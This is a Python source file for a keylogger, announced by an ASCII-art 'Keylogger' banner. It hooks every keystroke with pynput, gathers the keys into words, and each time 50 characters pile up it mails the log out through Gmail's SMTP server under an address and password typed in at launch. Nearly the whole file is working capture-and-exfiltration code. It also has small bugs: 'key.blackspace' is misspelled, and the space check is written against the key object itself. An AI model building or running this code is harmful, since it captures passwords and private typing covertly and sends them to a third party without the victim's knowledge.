import email
import getpass
from glob import glob
from mailbox import NotEmptyError
import smtplib

from pynput.keyboard import Key, Listener

print('''
                                                                                                                                                                       
KKKKKKKKK    KKKKKKK                                          lllllll                                                                                                  
K:::::::K    K:::::K                                          l:::::l                                                                                                  
K:::::::K    K:::::K                                          l:::::l                                                                                                  
K:::::::K   K::::::K                                          l:::::l                                                                                                  
KK::::::K  K:::::KKK    eeeeeeeeeeee  yyyyyyy           yyyyyyyl::::l    ooooooooooo      ggggggggg   ggggg   ggggggggg   ggggg    eeeeeeeeeeee    rrrrr   rrrrrrrrr   
  K:::::K K:::::K     ee::::::::::::ee y:::::y         y:::::y l::::l  oo:::::::::::oo   g:::::::::ggg::::g  g:::::::::ggg::::g  ee::::::::::::ee  r::::rrr:::::::::r  
  K::::::K:::::K     e::::::eeeee:::::eey:::::y       y:::::y  l::::l o:::::::::::::::o g:::::::::::::::::g g:::::::::::::::::g e::::::eeeee:::::eer:::::::::::::::::r 
  K:::::::::::K     e::::::e     e:::::e y:::::y     y:::::y   l::::l o:::::ooooo:::::og::::::ggggg::::::ggg::::::ggggg::::::gge::::::e     e:::::err::::::rrrrr::::::r
  K:::::::::::K     e:::::::eeeee::::::e  y:::::y   y:::::y    l::::l o::::o     o::::og:::::g     g:::::g g:::::g     g:::::g e:::::::eeeee::::::e r:::::r     r:::::r
  K::::::K:::::K    e:::::::::::::::::e    y:::::y y:::::y     l::::l o::::o     o::::og:::::g     g:::::g g:::::g     g:::::g e:::::::::::::::::e  r:::::r     rrrrrrr
  K:::::K K:::::K   e::::::eeeeeeeeeee      y:::::y:::::y      l::::l o::::o     o::::og:::::g     g:::::g g:::::g     g:::::g e::::::eeeeeeeeeee   r:::::r            
KK::::::K  K:::::KKKe:::::::e                y:::::::::y       l::::l o::::o     o::::og::::::g    g:::::g g::::::g    g:::::g e:::::::e            r:::::r            
K:::::::K   K::::::Ke::::::::e                y:::::::y       l::::::lo:::::ooooo:::::og:::::::ggggg:::::g g:::::::ggggg:::::g e::::::::e           r:::::r            
K:::::::K    K:::::K e::::::::eeeeeeee         y:::::y        l::::::lo:::::::::::::::o g::::::::::::::::g  g::::::::::::::::g  e::::::::eeeeeeee   r:::::r            
K:::::::K    K:::::K  ee:::::::::::::e        y:::::y         l::::::l oo:::::::::::oo   gg::::::::::::::g   gg::::::::::::::g   ee:::::::::::::e   r:::::r            
KKKKKKKKK    KKKKKKK    eeeeeeeeeeeeee       y:::::y          llllllll   ooooooooooo       gggggggg::::::g     gggggggg::::::g     eeeeeeeeeeeeee   rrrrrrr            
                                            y:::::y                                                g:::::g             g:::::g                                         
                                           y:::::y                                     gggggg      g:::::g gggggg      g:::::g                                         
                                          y:::::y                                      g:::::gg   gg:::::g g:::::gg   gg:::::g                                         
                                         y:::::y                                        g::::::ggg:::::::g  g::::::ggg:::::::g                                         
                                        yyyyyyy                                          gg:::::::::::::g    gg:::::::::::::g                                          
                                                                                           ggg::::::ggg        ggg::::::ggg                                            
                                                                                              gggggg              gggggg                    
''')
#set up email
email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

#logger
full_log = ''
word = ''
email_char_limit = 50

def  on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == key.space or key == key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_long()
            full_log= ''
    elif key == key.blackspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    if key == key.esc:
        return False

def send_long():
    server.sendmail(
        email,
        email,
        full_log

    )

with Listener(on_press=on_press )as listener:
    listener.join()



